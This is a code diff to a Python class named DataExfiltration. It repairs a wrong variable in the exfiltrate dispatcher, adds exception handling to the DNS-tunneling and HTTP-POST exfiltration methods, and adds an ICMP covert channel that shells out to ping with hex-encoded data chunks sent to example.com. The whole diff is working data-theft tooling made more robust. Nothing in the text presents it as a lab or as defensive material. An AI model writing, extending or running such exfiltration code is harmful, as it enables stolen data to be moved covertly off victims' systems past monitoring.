@@ -12,11 +12,11 @@ class DataExfiltration:
     def exfiltrate(self, data, method="http"):
         encrypted_data = self.encrypt_data(data)
         if method == "dns":
-            self.dns_tunneling(exfiltrated_data)
+            self.dns_tunneling(encrypted_data)
         elif method == "http":
-            self.http_exfiltration(exfiltrated_data)
+            self.http_exfiltration(encrypted_data)
         elif method == "covert":
-            self.covert_channel(exfiltrated_data)
+            self.covert_channel(encrypted_data)
         else:
             print(f"Unknown exfiltration method: {method}")
 
@@ -35,12 +35,21 @@ class DataExfiltration:
                 dns.resolver.resolve(domain, "A")
             except dns.resolver.NXDOMAIN:
                 pass
+            except Exception as e:
+                print(f"Error during DNS tunneling: {e}")
 
     def http_exfiltration(self, data):
         url = "http://example.com/exfiltrate"
         for chunk in self.chunk_data(data):
-            requests.post(url, data={"chunk": chunk})
+            try:
+                requests.post(url, data={"chunk": chunk})
+            except requests.RequestException as e:
+                print(f"Error during HTTP exfiltration: {e}")
 
     def covert_channel(self, data):
-        # Placeholder for covert channel implementation
+        # Implement covert channel exfiltration method
         print(f"Exfiltrating data via covert channel: {data}")
+        # Example: Using ICMP packets for covert exfiltration
+        import os
+        for chunk in self.chunk_data(data):
+            os.system(f"ping -c 1 -p {chunk.hex()} example.com")
